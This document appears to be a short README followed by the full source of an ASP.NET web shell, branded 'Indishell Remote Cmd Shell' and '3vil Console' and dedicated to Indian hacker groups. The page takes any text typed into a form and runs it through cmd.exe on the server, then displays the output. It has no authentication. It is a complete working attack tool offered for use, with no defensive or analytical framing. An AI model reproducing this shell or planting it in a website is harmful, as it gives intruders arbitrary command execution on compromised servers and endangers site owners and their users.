Remote Command Shell
===
A simple Remote Command Shell using ASp.Net, when hosted on the server this will let you run the command from the shell interface

```cs
<%@  Language="c#" %> 
<%@Import Namespace="System.IO" %> 
<%@Import Namespace="System.Diagnostics" %> 
<%@Import Namespace="System.Threading" %> 

<html> 
<head> 
    <title>Remote Cmd Shell Adv.</title> 

    <link href="specialEffect.css" rel="stylesheet" type="text/css" />
    <style type="text/css">
        .style1
        {
            width: 946px;
        }
        .style2
        {
            height: 29px;
            width: 946px;
        }
        .style3
        {
            width: 741px;
        }
        .style4
        {
            height: 29px;
            width: 741px;
        }
        </style>
</head> 
<body dir="ltr" style="filter:progid:DXImageTransform.Microsoft.Gradient(GradientType=0, StartColorStr='#C0000000', EndColorStr='#FF000000')";>
<center> 
<table width="668" border="0" cellpadding="3" cellspacing="3" class="main"> 
  <tr><td><h1  class="motionBlur">Indishell.in &nbsp;  Remote Cmd Shell <a href="http://www.indishell.in/">Copyright</a></h1></td></tr><tr><td> 
    <hr /> 
    <form runat="server"> 
        <table border="1" cellspacing="0" cellpadding="4" bordercolor="#899db1" style="width: 800px"> 
            <tr bgcolor="#d2dae4"> 
                <td bgcolor="#0080C0"> 
                    <b style="color: #FFFFFF">3vil Console&nbsp;&nbsp;</b>
                </td> 
            </tr> 
            <tr> 
                <td height="100"> 
                    <asp:Label ID="lblErrorMessage" runat="server" CssClass="errorMessage"></asp:Label> 
                <table cellpadding="6" style="width: 1092px"> 
                      <tr> 
                         <td valign="top" class="style1"> 
                            <asp:TextBox ID="txtCmdToExecute" runat="server" CssClass="txtBox2" TextMode="MultiLine" 
                                    TabIndex="1" Width="909px" BackColor="#1A1A1A" ForeColor="Red" 
                                    Height="57px"></asp:TextBox>                                  
                            </td> 
                            <td class="style3"> 
                                <asp:Button ID="btnLoginAdminSection" TabIndex="2" runat="server" CssClass="butnstyle2" 
                                    Width="161px" Height="27px" Text="Execute" 
                                    OnClick="btnLoginAdminSection_Click" class="glow"></asp:Button>                               
                                <br /> 
                                 <%--<asp:TextBox ID="tbResult" runat="server" Height="282px" Width="459px" 
                                    TextMode="MultiLine" class="orngs"></asp:TextBox>--%>
                            </td> 
                            </tr> 
                        <tr> 
                            <td class="style2"> 
                                <asp:Label ID="lbl" runat="server" Width="533px" CssClass="label1" 
                                    Height="23px">Command to Execute</asp:Label> 
                            </td> 
                            <td class="style4"> 
                                &nbsp;</td> 
                        </tr> 
                        <table border="1" width="100%"><tr> 
                            <td colspan="0" rowspan="0" >     
                           <pre><font face='courier new' size=3><asp:Label ID="Label1" runat="server" ForeColor="Silver"  
                            Text="Results.."></asp:Label>
                            </font><pre><font face='courier new' size=3><asp:Label 
                                    ID="lblResults" runat="server" ForeColor="#FF3300" 
                                    Height="31px"><font face='courier new' size=3>...</font></asp:Label><pre>&nbsp;</pre>                        
                             
                        </tr>  
                    </table> 
                    </td> 
            </tr> 
        </table> 
    </form> 
        <tr> 
            <td nowrap="nowrap"> 
            <p align="center"><font color="#666666" size="1" face="Arial"><br> 
                Copyright&nbsp; ©&nbsp; 3vil.93niu5</font><p align="center">
                        <font color="#666666" size="1" face="Arial">For Indian Cyber Army, Indian Warriors, Andhra Hackers, indishell & All indian groups.<br> 
            <br /><i>"Together we win.. Divide we fall</i><br />
            </font><font color="#c0c0c0" size="1" face="Arial"> 
        <a style="TEXT-DECORATION: none" href="http://www.indishell.in"> 
        <font color="#666666">indishell.in</font></a></font></td> 
        </tr> 
    </table> 
</body> 
</html> 

<script runat="server">           
    protected void btnLoginAdminSection_Click(object sender, System.EventArgs e) 
    {
        try
        {
            string strTempFile = Path.GetTempFileName();
            string strCmdToExecute = "cmd.exe";
            string strCmdParameters = " /c " + txtCmdToExecute.Text + ">" + "\"" + strTempFile + "\"";
            Process pProcess = Process.Start(strCmdToExecute, strCmdParameters);
            while (!pProcess.HasExited)
                Thread.Sleep(100);
            //tbResult.Text = strCmdToExecute + strCmdParameters;
            Label1.Text = Server.HtmlEncode(GetFileContent(strTempFile));
            File.Delete(strTempFile);
        }
        catch (Exception e1)
        {
            lblErrorMessage.Text = "[" + e1.Source + "]\n" + e1.Message;
        }
    } 
    public static string GetFileContent(string strFile) 
    { 
        try 
        { 
            FileStream fs = File.OpenRead(strFile); 
            if (fs == null) 
                return string.Empty; 
            StreamReader sr = new StreamReader(fs); 
            if (sr == null) 
                return string.Empty; 
            string strContent = sr.ReadToEnd(); 
            sr.Close(); 
            fs.Close(); 
            return strContent; 
        } 
        catch(Exception e)
        {             
            return ""; 
        } 
    }  
</script> 
```
